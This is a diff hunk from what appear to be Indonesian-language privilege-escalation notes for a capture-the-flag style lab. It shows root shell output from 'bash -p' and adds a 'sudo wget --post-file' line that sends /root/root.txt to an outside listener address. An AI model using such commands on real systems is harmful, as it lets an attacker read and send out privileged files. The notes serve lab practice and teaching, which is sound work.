@@ -46,3 +46,11 @@ sekarang tinggal akses bash begini: bash -p
     sh-3.2# id
     id
     uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+
+# wget
+
+read file with root permission
+
+    sudo wget --post-file=/root/root.txt 10.10.14.30:443
+
+
